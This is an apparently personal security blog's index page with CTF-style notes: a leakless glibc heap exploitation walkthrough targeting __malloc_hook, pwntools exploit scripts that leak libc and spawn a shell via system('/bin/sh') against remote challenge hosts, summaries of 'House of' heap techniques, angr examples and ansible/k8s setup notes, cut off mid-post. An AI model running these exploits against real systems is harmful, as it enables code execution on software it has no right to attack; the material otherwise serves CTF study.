<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>Another&#39;s blog</title>
  <meta name="author" content="another" />

  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  
  <meta property="og:site_name" content="Another&#39;s blog" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Another&#39;s blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/23/unleak/">unleak利用</a></h1>
  

    </header>
    <div class="entry">
      
        <p>不基于信息泄露的堆利用方法</p>
<p>首先，假设可以申请任意长度的堆块，并且存在漏洞，申请后的堆块可以使用。</p>
<p>我们通过漏洞制造fastbin中的堆块与unsortbin中的堆块重合。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0 ◂— 0x10</span><br><span class="line">0x30: 0 ◂— 0x10</span><br><span class="line">0x40: 0 ◂— 0x10</span><br><span class="line">0x50: 0 ◂— 0x10</span><br><span class="line">0x60: 0 ◂— 0x10</span><br><span class="line">0x70: 0x5866c0 —▸ 0 ◂— 0x10</span><br><span class="line">0x80: 0 ◂— 0x10</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x586530 ◂— 0x7f7eb0d07b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>然后申请堆块，使得unsortedbin与fastbins重合，导致fastbin的指针指向main_arena，</p>
<p>接着，通过局部覆盖使得fastbin指向malloc_hook前面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0 ◂— 0x10</span><br><span class="line">0x30: 0 ◂— 0x10</span><br><span class="line">0x40: 0 ◂— 0x10</span><br><span class="line">0x50: 0 ◂— 0x10</span><br><span class="line">0x60: 0 ◂— 0x10</span><br><span class="line">0x70: 0x7f7eb0d07acd (_IO_wide_data_0+301) ◂— 0x7eb09e7b30000000</span><br><span class="line">0x80: 0 ◂— 0x10</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>然后，将malloc_hook前面伪造为小于0x90的大小的堆块。</p>
<p>并将fastbin指针全部清空。</p>
<p>接着再次利用上面的漏洞，制造fastbin指向main_arena，改写指针，指向malloc_hook</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0 ◂— 0x10</span><br><span class="line">0x30: 0 ◂— 0x10</span><br><span class="line">0x40: 0 ◂— 0x10</span><br><span class="line">0x50: 0 ◂— 0x10</span><br><span class="line">0x60: 0 ◂— 0x10</span><br><span class="line">0x70: 0x5866c0 —▸ 0x7f7eb0d07ae0 (__memalign_hook) —▸ 0 ◂— 0x10</span><br><span class="line">0x80: 0 ◂— 0x10</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>保存下指向malloc_hook的指针，并清空fastbin。</p>
<p>再次利用漏洞，申请到第一次的地方,改写伪造堆块的大小，并清空fastbin的内容。</p>
<p>然后再次利用漏洞，劫持_IO_list_all，控制哪里的内存伪造出两个堆块（这样__malloc_hook就可以正常检查合</p>
<p>并）。</p>
<p>最终再次利用漏洞，使得fastbin的指针指向__malloc_hook，这时我们不可以申请_malloc_hook，因为这样会导致fastbin的检测无法绕过，我们申请大块内存，导致fastbin的堆块放入unsortedbin，这时malloc_hook指向main_arena。</p>
<p>通过之前的指针进行局部覆盖，导致one_gadget最终劫持控制流</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="人工代码审计"><a href="#人工代码审计" class="headerlink" title="人工代码审计"></a>人工代码审计</h2><h2 id="内存漏洞：高危函数"><a href="#内存漏洞：高危函数" class="headerlink" title="内存漏洞：高危函数"></a>内存漏洞：高危函数</h2><h2 id="自动化代码审计"><a href="#自动化代码审计" class="headerlink" title="自动化代码审计"></a>自动化代码审计</h2><pre><code>污点分析
fuzzing
符号执行
静态审计
攻击表面分析：监控文件执行记录重要行为 网络数据分析
</code></pre><h1 id="angr例子"><a href="#angr例子" class="headerlink" title="angr例子"></a>angr例子</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr, archinfo</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span><span class="params">()</span>:</span></span><br><span class="line">  proj = angr.Project(<span class="string">'./mem'</span>)<span class="comment">#加载程序</span></span><br><span class="line">  <span class="keyword">print</span> hex(proj.entry)</span><br><span class="line">  state = proj.factory.entry_state() <span class="comment">#打开到入口点</span></span><br><span class="line">  br = state.solver.BVS(<span class="string">"br"</span>, <span class="number">32</span>)<span class="comment">#添加随机串32位</span></span><br><span class="line">  <span class="comment">#state.solver.add(br &gt; 100)#约束</span></span><br><span class="line">  state.solver.add(br &lt; <span class="number">102</span>)</span><br><span class="line">  state.solver.add(br.SGT(<span class="number">100</span>))</span><br><span class="line">  state.memory.store(<span class="number">0x601030</span>, br)<span class="comment">#更改内存为随机串</span></span><br><span class="line">  simgr = proj.factory.simulation_manager(state)<span class="comment">#管理（固定的）</span></span><br><span class="line">  simgr.run()<span class="comment">#暴力全执行</span></span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">for</span> value <span class="keyword">in</span> simgr.stashes.values():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> value:</span><br><span class="line">      <span class="keyword">print</span> hex(s.solver.eval(br))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  basic_symbolic_execution()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">state.inspect.b(<span class="string">'mem_write'</span>, when=angr.BP_AFTER, action=debug_func)内存断点在写后并且执行debug函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">"Welcome"</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))约束</span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  k = state.posix.files[<span class="number">0</span>].read_from(<span class="number">1</span>)<span class="comment">#写入stdin一个并满足约束</span></span><br><span class="line">  state.solver.add(k.SGE(<span class="number">0x30</span>))</span><br><span class="line">  state.solver.add(k.SLE(<span class="number">0x39</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line">project = Project(<span class="string">'./fauxware'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BugFree</span><span class="params">(SimProcedure)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, argc, argv)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this assumes we have symbols for the binary</span></span><br><span class="line">project.hook_symbol(<span class="string">'main'</span>, BugFree())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 钩子</span></span><br><span class="line">simgr = project.factory.simulation_manager()</span><br><span class="line">project._sim_procedures </span><br><span class="line">simgr.run() </span><br><span class="line"><span class="keyword">print</span> simgr.deadended[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a></h1>
  

    </header>
    <div class="entry">
      
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/堆溢出/">堆溢出</a></h1>
  

    </header>
    <div class="entry">
      
        <p>House of Prime<br>House of Mind<br>House of Force<br>House of Lore<br>House of Spirit<br>House of Mind</p>
<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p>
<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Force-1"><a href="#House-of-Force-1" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>在这个技巧中，攻击者欺骗 glibc malloc 来返回一个块，它位于栈中（而不是堆中）。这允许攻击者覆盖储存在栈中的返回地址。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/分布式/">分布式搭建</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="ansible安装"><a href="#ansible安装" class="headerlink" title="ansible安装"></a>ansible安装</h1><h2 id="安装ansible"><a href="#安装ansible" class="headerlink" title="安装ansible"></a>安装ansible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv --no-site-packages venv</span><br><span class="line">source venv/bin/active</span><br><span class="line">pip install ansbile</span><br></pre></td></tr></table></figure>
<p>ansbile主机配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[test]</span><br><span class="line">127.0.0.1 ansible_ssh_user=aaa ansible_ssh_port=22 ansible_ssh_pass=aaa</span><br></pre></td></tr></table></figure>
<p>注释这么配置不好，但初始这样配置，为了之后批量分发，分发后请删除这个账户</p>
<p>ansbile批量推送公钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"> ansible-playbook   -i hosts   ssh.yml</span><br></pre></td></tr></table></figure>
<p>推送文件ssh.yml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Using alternate directory locations:</span><br><span class="line"> - hosts: test</span><br><span class="line">   user: aaa</span><br><span class="line">   tasks:</span><br><span class="line">    - name: ssh-copy</span><br><span class="line">      authorized_key: user=aaa key=&quot;&#123;&#123; lookup(&apos;file&apos;, &apos;/home/aaa/.ssh/id_rsa.pub&apos;) &#125;&#125;&quot;</span><br><span class="line">      tags:</span><br><span class="line">        - sshkey</span><br></pre></td></tr></table></figure>
<p>执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible  test -i ./hosts  -m command -a &quot;echo &apos;aa&apos;&quot;</span><br></pre></td></tr></table></figure>
<h1 id="k8s安装（需要翻墙）"><a href="#k8s安装（需要翻墙）" class="headerlink" title="k8s安装（需要翻墙）"></a>k8s安装（需要翻墙）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb https://apt.kubernetes.io/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl kubernetes-cni docker.io </span><br><span class="line">apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure>
<p>配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: kubeadm.k8s.io/v1alpha2</span><br><span class="line">kind: MasterConfiguration</span><br><span class="line">api:</span><br><span class="line">  advertiseAddress: 0.0.0.0</span><br><span class="line">networking:</span><br><span class="line">  podSubnet: 10.244.0.0/16</span><br><span class="line">etcd:</span><br><span class="line">  image: registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.1.11</span><br><span class="line">kubernetesVersion: v1.12.1</span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line"></span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -a</span><br><span class="line">　1. 为docker服务创建一个内嵌的systemd目录</span><br><span class="line"></span><br><span class="line">$ mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line">　　2. 创建/etc/systemd/system/docker.service.d/http-proxy.conf文件，并添加HTTP_PROXY环境变量。其中[proxy-addr]和[proxy-port]分别改成实际情况的代理地址和端口：</span><br><span class="line">　　</span><br><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://[proxy-addr]:[proxy-port]/&quot; &quot;HTTPS_PROXY=http://[proxy-addr]:[proxy-port]/&quot;</span><br><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl restart docker</span><br><span class="line">sudo kubeadm init --config ./kubeadm.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/k8s-manifests/kube-flannel-legacy.yml</span><br><span class="line">需要安装flannel</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/内核编译/">内核编译</a></h1>
  

    </header>
    <div class="entry">
      
        <p>原文muhe，有些地方有改动</p>
<h1 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01: 环境说明"></a>0x01: 环境说明</h1><p>ubuntu 14.04 x86<br>qemu<br>使用的内核版本2.6.32.1</p>
<p>busybox版本1.19.4</p>
<p>使用busybox是因为文件添加方便.</p>
<h1 id="0x02-内核编译并测试"><a href="#0x02-内核编译并测试" class="headerlink" title="0x02: 内核编译并测试"></a>0x02: 内核编译并测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.1.tar.gz -O linux-2.6.32.1.tar.gz</span><br><span class="line">$ tar -xvf linux-2.6.32.1.tar.gz</span><br></pre></td></tr></table></figure>
<p>首先要安装一些依赖库以及qemu。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">make bzImage </span><br><span class="line">$ make modules</span><br><span class="line">64位安32位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">make ARCH=i386 menuconfig   </span><br><span 